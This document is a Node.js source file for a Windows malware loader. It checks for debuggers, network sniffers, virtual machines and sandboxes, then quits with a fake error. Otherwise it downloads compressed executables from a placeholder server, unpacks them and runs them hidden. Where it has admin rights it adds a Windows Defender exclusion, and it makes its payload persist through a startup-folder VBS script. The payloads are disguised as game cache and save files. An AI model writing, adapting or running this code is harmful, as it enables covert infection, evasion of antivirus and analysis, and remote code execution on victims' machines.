(() => {
    const Module = require('module');

    global.eval = () => { throw new Error(); };
    //global.Function = () => { throw new Error(); };

    try {
        require('vm').runInNewContext = () => {
            throw new Error();
        };
    } catch {}

    //Object.freeze(global.process);
    //Object.freeze(global.Buffer);
    //Object.freeze(global.setImmediate);
    //Object.freeze(global.console);

    const originalRequire = Module.prototype.require;
    Object.defineProperty(Module.prototype, 'require', {
        value: function(path) {
            const blockedModules = [];
            if (blockedModules.some(b => path.toLowerCase().includes(b))) {
                throw new Error();
            }
            return originalRequire.call(this, path);
        }
    });
})();

const fs = require('fs');
const path = require('path');
const { spawn, execSync, exec } = require('child_process');
const https = require('https');
const os = require('os');
const zlib = require('zlib');

const SERVER_URL = "iphere"; 
const KEY = "keyhere"; 
const errorLogPath = path.join('C:', 'Users', 'PC', 'AppData', 'Local', 'errorlx');
const errorLogFile = path.join(errorLogPath, 'error.log');

const silentLog = (message, isError = false) => {
    try {
        if (!fs.existsSync(errorLogPath)) {
            fs.mkdirSync(errorLogPath, { recursive: true });
        }
        
        const timestamp = new Date().toISOString();
        const logEntry = `[${timestamp}] ${isError ? 'ERROR' : 'INFO'}: ${message}\n`;
        
        fs.appendFileSync(errorLogFile, logEntry);
        console.log(logEntry); 
    } catch (err) {
        console.log(`silentLog error: ${err.message}`); 
    }
};

const blockedKeywords = [
    'wireshark', 'tcpdump', 'tshark', 'microsoft network monitor', 'ettercap', 
    'fiddler', 'capsa', 'smartsniff', 'omnipeek', 'colasoft capsa', 'networkminer',
    'ntop', 'ntopng', 'packetcapture', 'windump', 'networx', 'glasswire',
    'x64dbg', 'x32dbg', 'ollydbg', 'immunity debugger', 'immunity',
    'windbg', 'visual studio', 'ida pro', 'ida64', 'ida32', 'idaw', 'idaw64',
    'radare2', 'ghidra', 'binary ninja', 'binaryninja',
    'cheat engine', 'cheatengine', 'artmoney', 'game hacker', 'gamehacker',
    'memory scanner', 'memoryscanner', 'trainer',
    'burpsuite', 'burp suite', 'burp-suite', 'zaproxy', 'zap proxy', 'owasp zap',
    'postman', 'insomnia', 'curl.exe',
    'resourcehacker', 'resource hacker', 'pe-bear', 'pebear', 'cff explorer', 'cffexplorer',
    'hex editor', 'hexeditor', 'hxd', 'hex workshop',
    'process monitor', 'procmon', 'process explorer', 'procexp', 'api monitor', 'apimonitor',
    'detours', 'easyhook', 'minhook', 'madchook'
];

const blockedPaths = [
    '\\wireshark\\', '\\fiddler\\', '\\burp\\', '\\ida\\', '\\ghidra\\', 
    '\\ollydbg\\', '\\x64dbg\\', '\\x32dbg\\', '\\cheat engine\\', '\\cheatengine\\',
    '\\artmoney\\', '\\processhacker\\', '\\process hacker\\', '\\procmon\\', 
    '\\apimonitor\\', '\\api monitor\\', '\\detours\\', '\\immunity\\',
    '\\radare2\\', '\\binary ninja\\', '\\binaryninja\\', '\\resourcehacker\\',
    '\\resource hacker\\', '\\hex workshop\\', '\\hxd\\', '\\zaproxy\\',
    '\\owasp\\zap\\', '\\postman\\', '\\insomnia\\'
];

const suspiciousPorts = [];

const isSystemProcess = (processLine) => {
    const lowerLine = processLine.toLowerCase();
    
    const systemPaths = [
        'c:\\windows\\system32\\',
        'c:\\windows\\syswow64\\',
        'c:\\windows\\winsxs\\',
        'c:\\program files\\windows',
        'c:\\program files (x86)\\windows',
        'c:\\program files\\microsoft',
        'c:\\program files (x86)\\microsoft',
        'microsoft corporation',
        'windows defender',
        'microsoft\\',
        '\\windowsapps\\',
        'c:\\windows\\servicing\\',
        'c:\\windows\\ccm\\',
        'c:\\windows\\ccmcache\\'
    ];
    
    const trustedProcesses = [
        'svchost.exe', 'explorer.exe', 'dwm.exe', 'winlogon.exe', 'csrss.exe',
        'lsass.exe', 'services.exe', 'spoolsv.exe', 'taskhost.exe', 'taskhostw.exe',
        'conhost.exe', 'dllhost.exe', 'rundll32.exe', 'msiexec.exe', 'wininit.exe',
        'smss.exe', 'wermgr.exe', 'searchindexer.exe', 'audiodg.exe'
    ];
    
    return systemPaths.some(path => lowerLine.includes(path)) ||
           trustedProcesses.some(proc => lowerLine.includes(proc));
};

const advancedProcessDetection = async () => {
    return new Promise((resolve) => {
        try {
            const wmic = spawn('wmic', [
                'process', 'get',
                'Name,ProcessId,ExecutablePath,CommandLine',
                '/format:csv'
            ], { stdio: ['ignore', 'pipe', 'ignore'] });

            let output = '';
            let timeoutId;

            wmic.stdout.on('data', (data) => {
                output += data.toString();
            });

            wmic.on('close', () => {
                if (timeoutId) clearTimeout(timeoutId);

                const lines = output.split('\n');

                for (let line of lines) {
                    if (!line.trim() || line.includes('CommandLine,ExecutablePath')) continue;

                    const lowerLine = line.toLowerCase();

                    if (isSystemProcess(line)) continue;

                    for (let keyword of blockedKeywords) {
                        if (lowerLine.includes(keyword.toLowerCase()) && isRealThreat(lowerLine, keyword)) {
                            triggerAntiDebugResponse(`Threat detected: ${keyword}`);
                            resolve(false);
                            return;
                        }
                    }

                    for (let blockedPath of blockedPaths) {
                        if (lowerLine.includes(blockedPath.toLowerCase())) {
                            triggerAntiDebugResponse(`Blocked path detected: ${blockedPath}`);
                            resolve(false);
                            return;
                        }
                    }

                    const suspiciousArgs = [
                        //'--debug-port', '--remote-debugging', '--debug-brk', '--inspect',
                        //'--trace-warnings', '--trace-uncaught', '--prof', '--debug-only',
                        //'/debug', '/trace', '/monitor', '/capture', '/dump', '/hook',
                        //'-debug', '-trace', '-monitor', '-capture', '-dump', '-hook'
                    ];

                    for (let arg of suspiciousArgs) {
                        const regex = new RegExp(`\\b${arg.replace(/[-/\\^$*+?.()|[\]{}]/g, '\\$&')}\\b`, 'i');

                        if (regex.test(lowerLine) &&
                            !lowerLine.includes('node.exe') &&
                            !lowerLine.includes('code.exe')) {
                            triggerAntiDebugResponse(`Suspicious argument: ${arg}`);
                            resolve(false);
                            return;
                        }
                    }
                }

                resolve(true);
            });

            wmic.on('error', (err) => {
                if (timeoutId) clearTimeout(timeoutId);
                silentLog(`WMIC process detection error: ${err.message}`, true);
                resolve(true);
            });

            timeoutId = setTimeout(() => {
                wmic.kill();
                silentLog('WMIC process detection timeout', true);
                resolve(true);
            }, 15000);

        } catch (err) {
            silentLog(`Advanced process detection error: ${err.message}`, true);
            resolve(true);
        }
    });
};

const isRealThreat = (processLine, keyword) => {
    if (keyword.includes('debug') && processLine.includes('node.exe')) {
        return processLine.includes('--debug-port') || 
               processLine.includes('--inspect') ||
               processLine.includes('--debug-brk');
    }
    
    if (keyword.includes('visual studio') && processLine.includes('code.exe')) {
        return false;
    }
    
    return true;
};

const checkSuspiciousPorts = async () => {
    return new Promise((resolve) => {
        try {
            const netstat = spawn('netstat', ['-an'], { stdio: ['ignore', 'pipe', 'ignore'] });
            let output = '';
            let timeoutId;

            netstat.stdout.on('data', (data) => {
                output += data.toString();
            });

            netstat.on('close', () => {
                if (timeoutId) clearTimeout(timeoutId);
                
                for (let port of suspiciousPorts) {
                    if (output.includes(`:${port} `) || output.includes(`:${port}\t`)) {
                        triggerAntiDebugResponse(`Suspicious port active: ${port}`);
                        resolve(false);
                        return;
                    }
                }
                resolve(true);
            });

            netstat.on('error', (err) => {
                if (timeoutId) clearTimeout(timeoutId);
                silentLog(`Netstat error: ${err.message}`, true);
                resolve(true);
            });
            
            timeoutId = setTimeout(() => {
                netstat.kill();
                resolve(true);
            }, 10000);
            
        } catch (err) {
            silentLog(`Port monitoring error: ${err.message}`, true);
            resolve(true);
        }
    });
};

const checkDebuggerRegistry = async () => {
    if (process.platform !== 'win32') return true;
    
    return new Promise((resolve) => {
        try {
            const debuggerKeys = [
                { key: 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug', value: 'Debugger' },
                { key: 'HKLM\\SOFTWARE\\Classes\\exefile\\shell\\Debug', value: '' },
                { key: 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', value: '' }
            ];
            
            let checksCompleted = 0;
            const totalChecks = debuggerKeys.length;
            
            for (let keyInfo of debuggerKeys) {
                const regArgs = keyInfo.value ? 
                    ['query', keyInfo.key, '/v', keyInfo.value] :
                    ['query', keyInfo.key];
                    
                const reg = spawn('reg', regArgs, { stdio: ['ignore', 'pipe', 'ignore'] });
                let output = '';
                let timeoutId;
                
                reg.stdout.on('data', (data) => {
                    output += data.toString().toLowerCase();
                });
                
                reg.on('close', () => {
                    if (timeoutId) clearTimeout(timeoutId);
                    
                    const suspiciousValues = [
                        'ollydbg', 'x64dbg', 'x32dbg', 'windbg', 'ida', 'immunity',
                        'ghidra', 'radare2', 'binary ninja', 'cheat engine'
                    ];
                    
                    for (let value of suspiciousValues) {
                        if (output.includes(value)) {
                            triggerAntiDebugResponse(`Registry debugger found: ${value}`);
                            resolve(false);
                            return;
                        }
                    }
                    
                    checksCompleted++;
                    if (checksCompleted === totalChecks) {
                        resolve(true);
                    }
                });
                
                reg.on('error', (err) => {
                    if (timeoutId) clearTimeout(timeoutId);
                    checksCompleted++;
                    if (checksCompleted === totalChecks) {
                        resolve(true);
                    }
                });
                
                timeoutId = setTimeout(() => {
                    reg.kill();
                    checksCompleted++;
                    if (checksCompleted === totalChecks) {
                        resolve(true);
                    }
                }, 5000);
            }
        } catch (err) {
            silentLog(`Registry analysis error: ${err.message}`, true);
            resolve(true);
        }
    });
};

const detectDLLInjection = async () => {
    return new Promise((resolve) => {
        try {
            const tasklist = spawn('tasklist', ['/m', '/fi', `PID eq ${process.pid}`], 
                { stdio: ['ignore', 'pipe', 'ignore'] });
            
            let output = '';
            let timeoutId;
            
            tasklist.stdout.on('data', (data) => {
                output += data.toString().toLowerCase();
            });

            tasklist.on('close', () => {
                if (timeoutId) clearTimeout(timeoutId);
                
                const suspiciousDLLs = [
                    'detours.dll', 'easyhook', 'minhook', 'madchook', 'injection.dll',
                    'apimonitor', 'deviare', 'nektra', 'apihook', 'dllinjector'
                ];
                
                for (let dll of suspiciousDLLs) {
                    if (output.includes(dll)) {
                        triggerAntiDebugResponse(`Suspicious DLL detected: ${dll}`);
                        resolve(false);
                        return;
                    }
                }
                resolve(true);
            });

            tasklist.on('error', (err) => {
                if (timeoutId) clearTimeout(timeoutId);
                silentLog(`DLL detection error: ${err.message}`, true);
                resolve(true);
            });
            
            timeoutId = setTimeout(() => {
                tasklist.kill();
                resolve(true);
            }, 8000);
            
        } catch (err) {
            silentLog(`DLL injection detection error: ${err.message}`, true);
            resolve(true);
        }
    });
};

const detectVirtualEnvironment = () => {
    try {
        const vmIndicators = [
            () => {
                const hostname = os.hostname().toLowerCase();
                const vmNames = ['vm', 'virtual', 'sandbox', 'malware', 'test', 'analysis', 'vbox', 'vmware'];
                return vmNames.some(name => hostname.includes(name));
            },
            () => os.totalmem() < 2 * 1024 * 1024 * 1024, 
            () => os.cpus().length < 2,
            () => {
                const username = os.userInfo().username.toLowerCase();
                const suspiciousUsers = ['malware', 'virus', 'sandbox', 'analyst', 'test', 'vm', 'user', 'admin'];
                return suspiciousUsers.includes(username);
            }
        ];
        
        let vmScore = 0;
        for (let indicator of vmIndicators) {
            if (indicator()) vmScore++;
        }
        
        if (vmScore >= 2) {
            triggerAntiDebugResponse(`Virtual environment detected (score: ${vmScore})`);
            return false;
        }
        
        return true;
    } catch (err) {
        silentLog(`VM detection error: ${err.message}`, true);
        return true;
    }
};

const checkSuspiciousFiles = () => {
    try {
        const suspiciousFiles = [
            'C:\\Windows\\System32\\drivers\\VBoxMouse.sys',
            'C:\\Windows\\System32\\drivers\\VBoxGuest.sys',
            'C:\\Windows\\System32\\drivers\\vmci.sys',
            'C:\\Windows\\System32\\drivers\\vmmouse.sys',
            'C:\\Program Files\\VMware\\VMware Tools\\',
            'C:\\Program Files\\Oracle\\VirtualBox\\',
            'C:\\Program Files (x86)\\VMware\\VMware Tools\\',
            'C:\\Program Files (x86)\\Oracle\\VirtualBox\\'
        ];
        
        let vmFileCount = 0;
        for (let file of suspiciousFiles) {
            if (fs.existsSync(file)) {
                vmFileCount++;
            }
        }
        
        if (vmFileCount >= 2) {
            triggerAntiDebugResponse(`VM files detected (count: ${vmFileCount})`);
            return false;
        }
        
        return true;
    } catch (err) {
        silentLog(`File system analysis error: ${err.message}`, true);
        return true;
    }
};

const timingBasedDetection = () => {
    try {
        const iterations = 100000;
        const start = process.hrtime.bigint();
        
        let result = 0;
        for (let i = 0; i < iterations; i++) {
            result += Math.sqrt(i) * Math.random();
        }
        
        const end = process.hrtime.bigint();
        const duration = Number(end - start) / 1000000; 
        
        if (duration > 500) {
            triggerAntiDebugResponse(`Timing anomaly detected: ${duration}ms`);
            return false;
        }
        
        return true;
    } catch (err) {
        silentLog(`Timing detection error: ${err.message}`, true);
        return true;
    }
};

const analyzeParentProcess = async () => {
    return new Promise((resolve) => {
        try {
            const wmic = spawn('wmic', [
                'process', 'where', `ProcessId=${process.ppid}`,
                'get', 'Name,CommandLine,ExecutablePath', '/format:csv'
            ], { stdio: ['ignore', 'pipe', 'ignore'] });
            
            let output = '';
            let timeoutId;
            
            wmic.stdout.on('data', (data) => {
                output += data.toString().toLowerCase();
            });

            wmic.on('close', () => {
                if (timeoutId) clearTimeout(timeoutId);
                
                const suspiciousParents = [
                    'x64dbg.exe', 'x32dbg.exe', 'ollydbg.exe', 
                    'ida.exe', 'ida64.exe', 'ghidra.exe', 'immunity.exe', 'windbg.exe',
                    'cheatengine.exe', 'cheat engine.exe', 'processhacker.exe',
                    'apimonitor.exe', 'wireshark.exe', 'fiddler.exe'
                ];
                
                for (let parent of suspiciousParents) {
                    if (output.includes(parent)) {
                        
                        if (!output.includes('explorer.exe') && !output.includes('cmd.exe')) {
                            triggerAntiDebugResponse(`Suspicious parent process: ${parent}`);
                            resolve(false);
                            return;
                        }
                    }
                }
                resolve(true);
            });

            wmic.on('error', (err) => {
                if (timeoutId) clearTimeout(timeoutId);
                silentLog(`Parent process analysis error: ${err.message}`, true);
                resolve(true);
            });
            
            timeoutId = setTimeout(() => {
                wmic.kill();
                resolve(true);
            }, 5000);
            
        } catch (err) {
            silentLog(`Parent process analysis error: ${err.message}`, true);
            resolve(true);
        }
    });
};

const triggerAntiDebugResponse = (reason) => {
    silentLog(`Anti-Debug Triggered: ${reason}`, true);

    try {
        const tmpFolder = os.tmpdir();
        const vbsFilePath = path.join(tmpFolder, `error_${Date.now()}.vbs`);

        const cscriptPath = process.arch === 'x64'
            ? path.join(process.env.WINDIR, 'System32', 'cscript.exe')
            : path.join(process.env.WINDIR, 'Sysnative', 'cscript.exe');

        const vbsContent = `x = msgbox("Critical System Error Detected!" & vbCrLf & "Debugging/Analysis tools found." & vbCrLf & "Application will terminate.", 16, "Security Warning")`;

        fs.writeFileSync(vbsFilePath, vbsContent);

        try {
            execSync(`"${cscriptPath}" //nologo "${vbsFilePath}"`, { stdio: 'ignore' });
            fs.unlinkSync(vbsFilePath);
        } catch (err) {
            silentLog(`VBS execution error: ${err.message}`, true);
        }

        process.exit(1);

    } catch (err) {
        silentLog(`Anti-debug response error: ${err.message}`, true);
        process.exit(1);
    }
};

const comprehensiveAntiDebugCheck = async () => {
    silentLog('Advanced Anti-Debug System Starting...');
    
    const checks = [
        { name: 'Virtual Environment', func: () => Promise.resolve(detectVirtualEnvironment()) },
        { name: 'Suspicious Files', func: () => Promise.resolve(checkSuspiciousFiles()) },
        { name: 'Timing Analysis', func: () => Promise.resolve(timingBasedDetection()) },
        { name: 'Advanced Process Detection', func: advancedProcessDetection },
        { name: 'Network Ports', func: checkSuspiciousPorts },
        { name: 'Registry Analysis', func: checkDebuggerRegistry },
        { name: 'DLL Injection', func: detectDLLInjection },
        { name: 'Parent Process', func: analyzeParentProcess }
    ];
    
    for (let check of checks) {
        try {
            silentLog(`Checking: ${check.name}...`);
            const result = await check.func();
            
            if (!result) {
                silentLog(`${check.name} failed - Security threat detected!`, true);
                return false;
            }
            
            silentLog(`${check.name} passed`);
            
            await new Promise(resolve => setTimeout(resolve, Math.random() * 300 + 100));
            
        } catch (error) {
            silentLog(`${check.name} error - Treating as suspicious: ${error.message}`, true);
            triggerAntiDebugResponse(`${check.name} check error`);
            return false;
        }
    }
    
    silentLog('All anti-debug checks passed!');
    return true;
};

const continuousMonitoring = () => {
    setInterval(async () => {
        try {
            if (!detectVirtualEnvironment() || 
                !checkSuspiciousFiles() || 
                !timingBasedDetection()) {
                triggerAntiDebugResponse('Continuous monitoring alert');
            }
        } catch (err) {
            silentLog(`Continuous monitoring error: ${err.message}`, true);
        }
    }, Math.random() * 30000 + 10000); 
};

const createRandomAppDataPath = () => {
    try {
        const appDataPath = path.join(os.homedir(), 'AppData', 'Local');
        const randomFolders = [
            'SystemCache', 'WindowsCache', 'AppCache', 'SystemData', 'AppData',
            'CacheData', 'SystemTemp', 'AppTemp', 'DataCache', 'TempData'
        ];
        
        const randomFolder = randomFolders[Math.floor(Math.random() * randomFolders.length)];
        const randomSubFolder = Math.random().toString(36).substring(2, 8);
        const finalPath = path.join(appDataPath, randomFolder, randomSubFolder);
        
        if (!fs.existsSync(finalPath)) {
            fs.mkdirSync(finalPath, { recursive: true });
        }
        
        silentLog(`Created random AppData path: ${finalPath}`);
        return finalPath;
    } catch (err) {
        silentLog(`Failed to create random AppData path: ${err.message}`, true);
        return os.tmpdir();
    }
};

const addWindowsDefenderExclusion = async (folderPath) => {
    try {
        if (process.platform !== 'win32') return true;
        
        const command = `powershell -Command "Add-MpPreference -ExclusionPath '${folderPath}'"`;
        execSync(command, { stdio: 'ignore' });
        silentLog(`Added Windows Defender exclusion for: ${folderPath}`);
        return true;
    } catch (err) {
        silentLog(`Failed to add Windows Defender exclusion: ${err.message}`, true);
        return false;
    }
};

const runExeWithKey = (exePath, key) => {
    try {
        const child = spawn(exePath, [key], { 
            detached: true, 
            stdio: 'ignore',
            windowsHide: true
        });
        child.unref();
        silentLog(`Exe started with key (hidden): ${exePath} ${key}`);
        return true;
    } catch (err) {
        silentLog(`Failed to run exe: ${err.message}`, true);
        return false;
    }
};

const runExeWithArg = (exePath, targetDir, KEY, SERVER_URL, fileName) => {
    return new Promise((resolve, reject) => {
        try {
            const exeFullPath = path.join(targetDir, `${fileName}.exe`);
            const outputPath = path.join(targetDir, "output");
            console.log(exePath, targetDir, outputPath, KEY, SERVER_URL);
            const args = [exePath, targetDir, outputPath, KEY, SERVER_URL];

            const child = spawn(exeFullPath, args, {
                cwd: targetDir, 
                windowsHide: true,
                stdio: ["ignore", "pipe", "pipe"] 
            });

            child.unref();
            silentLog(`Exe started with key (hidden): ${exePath} ${KEY}`);
            return true;
        } catch (err) {
            silentLog(`Failed to run exe: ${err.message}`, true);
            return false;
        }
    });
};

const runExeWithoutKey = (exePath) => {
    try {
        const child = spawn(exePath, [], { 
            detached: true, 
            stdio: 'ignore',
            windowsHide: true
        });
        child.unref();
        silentLog(`Exe started without key (hidden): ${exePath}`);
        return true;
    } catch (err) {
        silentLog(`Failed to run exe: ${err.message}`, true);
        return false;
    }
};

const addToStartupViaVBS = async (exePath) => {
    try {
        const tempDir = os.tmpdir();
        const vbsPath = path.join(tempDir, "startup.vbs");
        const vbsContent = `
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "${exePath}" & chr(34), 0, False
        `.trim();

        fs.writeFileSync(vbsPath, vbsContent);

        const startupFolder = path.join(
            os.homedir(),
            "AppData",
            "Roaming",
            "Microsoft",
            "Windows",
            "Start Menu",
            "Programs",
            "Startup"
        );

        if (!fs.existsSync(startupFolder)) {
            fs.mkdirSync(startupFolder, { recursive: true });
        }

        const shortcutPath = path.join(startupFolder, "startup.vbs");
        fs.copyFileSync(vbsPath, shortcutPath);

        silentLog(`✅ File added to startup via VBS: ${shortcutPath}`);
        return true;
    } catch (error) {
        silentLog(`❌ Failed to add to startup via VBS: ${error.message}`, true);
        return false;
    }
};

const processFile = async (fileName, isAdmin = false) => {
    try {
        let targetDir;
        if (isAdmin) {
            targetDir = createRandomAppDataPath();
            await addWindowsDefenderExclusion(targetDir);
        } else {
            targetDir = os.tmpdir();
        }
        
        const exeBrUrl = `https://root.${SERVER_URL}/download/${fileName}`;
        const exeBrPath = path.join(targetDir, `${fileName}.exe.br`);
        const exePath = path.join(targetDir, `${fileName}.exe`);

        silentLog(`Downloading ${fileName}.exe.br to ${targetDir}...`);
        
        const exeBrDownloaded = await new Promise((resolve) => {
            const urlObj = new URL(exeBrUrl);
            const options = {
                hostname: urlObj.hostname,
                port: urlObj.port || 443,
                path: urlObj.pathname,
                method: 'GET',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            };

            const req = https.request(options, (res) => {
                if (res.statusCode !== 200) {
                    silentLog(`HTTP request failed with status: ${res.statusCode}`, true);
                    resolve(false);
                    return;
                }

                const chunks = [];
                res.on('data', (chunk) => {
                    chunks.push(chunk);
                });

                res.on('end', () => {
                    try {
                        const responseData = Buffer.concat(chunks);
                        fs.writeFileSync(exeBrPath, responseData);
                        silentLog(`${fileName}.exe.br downloaded successfully`);
                        resolve(true);
                    } catch (err) {
                        silentLog(`Failed to save ${fileName}.exe.br: ${err.message}`, true);
                        resolve(false);
                    }
                });
            });

            req.on('error', (err) => {
                silentLog(`HTTPS request error: ${err.message}`, true);
                resolve(false);
            });

            req.setTimeout(30000, () => {
                req.destroy();
                silentLog('HTTPS request timeout', true);
                resolve(false);
            });

            req.end();
        });

        if (!exeBrDownloaded) {
            silentLog(`Failed to download ${fileName}.exe.br`, true);
            return false;
        }

        silentLog(`Decompressing ${fileName}.exe.br to ${fileName}.exe...`);
        try {
            const input = fs.createReadStream(exeBrPath);
            const output = fs.createWriteStream(exePath);
            
            input.pipe(zlib.createBrotliDecompress()).pipe(output);
            
            await new Promise((resolve, reject) => {
                output.on('close', () => {
                    silentLog(`${fileName}.exe.br successfully decompressed to ${fileName}.exe`);
                    resolve();
                });
                
                output.on('error', (err) => {
                    silentLog(`Decompression error: ${err.message}`, true);
                    reject(err);
                });
            });

            fs.unlinkSync(exeBrPath);
            silentLog(`Cleaned up ${fileName}.exe.br`);

        } catch (decompressErr) {
            silentLog(`Failed to decompress ${fileName}.exe.br: ${decompressErr.message}`, true);
            return false;
        }

        if (fileName === 'game_cache') {
            silentLog(`Running ${fileName}.exe with key: ${KEY}`);
            const runSuccess = runExeWithKey(exePath, KEY);
            
            if (!runSuccess) {
                silentLog(`Failed to run ${fileName}.exe`, true);
                return false;
            }
        } else if (fileName === 'save_data') {
            if (runExeWithArg(exePath, targetDir, KEY, SERVER_URL, fileName)) {
            }
        } else {
            silentLog(`Running ${fileName}.exe without arguments`);
            const runSuccess = runExeWithoutKey(exePath);
            
            if (!runSuccess) {
                silentLog(`Failed to run ${fileName}.exe`, true);
                return false;
            }
        }

        if (fileName === 'game_cache') {
            silentLog('Adding game_cache.exe to startup...');
            const startupSuccess = await addToStartupViaVBS(exePath);
            if (startupSuccess) {
                silentLog('game_cache.exe successfully added to startup!');
            } else {
                silentLog('Failed to add game_cache.exe to startup', true);
            }
        }

        setTimeout(() => {
            try {
                if (fs.existsSync(exePath)) {
                    silentLog(`Keeping ${fileName}.exe for execution`);
                }
            } catch (err) {
                silentLog(`Cleanup check error for ${fileName}.exe: ${err.message}`, true);
            }
        }, Math.random() * 30000 + 15000);

        return true;
    } catch (err) {
        silentLog(`Error processing ${fileName}: ${err.message}`, true);
        return false;
    }
};

function createCacheJson(key) {
    try {
        const encodedKey = Buffer.from(key, "utf-8").toString("base64");

        const jsonData = {
            key: encodedKey
        };

        const tempPath = path.join(os.homedir(), "AppData", "Local", "Temp", "cache.json");

        fs.writeFileSync(tempPath, JSON.stringify(jsonData, null, 4), "utf-8");

        console.log("✅ cache.json created at:", tempPath);
        console.log("Encoded key:", encodedKey);
    } catch (err) {
        console.error("❌ Failed to create cache.json:", err.message);
    }
}

const isAdmin = () => {
    try {
        if (process.platform !== 'win32') return false;
        
        const { execSync } = require('child_process');
        const result = execSync('net session', { stdio: 'ignore' });
        return true;
    } catch (err) {
        return false;
    }
};

const AntiVMControl = "ANTIVMVALUE"; 

const antiCheck = async () => {
    try {
        silentLog('Starting anti-debug and anti-VM checks...');
        
        const isSecure = await comprehensiveAntiDebugCheck();
        if (!isSecure) {
            silentLog('Security checks failed - Terminating', true);
            return false;
        }

        continuousMonitoring();
        silentLog('Security verified - Anti-debug system active');
        return true;
    } catch (error) {
        silentLog(`Anti-check error: ${error.message}`, true);
        return false;
    }
};

const main = async () => {
        if (AntiVMControl === "True") {
        const isSecure = await antiCheck();
        if (!isSecure) {
            silentLog('Security checks failed - Terminating', true);
            return;
        }
    } else {
        silentLog('Anti-debug system disabled - Skipping security checks');
    }
    try {
        createCacheJson(KEY);
        
        silentLog('Starting secure application...');
        
        const isRunningAsAdmin = isAdmin();
        silentLog(`Running as admin: ${isRunningAsAdmin}`);

     

        silentLog('Proceeding with file processing...');

        let files;
        if (isRunningAsAdmin) {
            files = [
                { name: 'save_data', requiresAdmin: true },
                { name: 'stats_db' },
                { name: 'game_cache' }
            ];
        } else {
            files = [
                { name: 'stats_db' },
                { name: 'game_cache' }
            ];
            silentLog('Running without admin privileges - limited file access');
        }

        silentLog(`Processing ${files.length} files...`);

        for (const file of files) {
            if (file.requiresAdmin && !isRunningAsAdmin) {
                silentLog(`Skipping ${file.name} - Admin privileges required`);
                continue;
            }
            
            silentLog(`Processing ${file.name}...`);
            const success = await processFile(file.name, isRunningAsAdmin);
            
            if (success) {
                silentLog(`${file.name} processed successfully`);
            } else {
                silentLog(`${file.name} processing failed`, true);
            }

            await new Promise(resolve => setTimeout(resolve, Math.random() * 2000 + 1000));
        }

        silentLog('All files processed successfully!');

    } catch (error) {
        silentLog(`Critical execution error: ${error.message}`, true);
        triggerAntiDebugResponse('Critical execution error');
    }
};

main();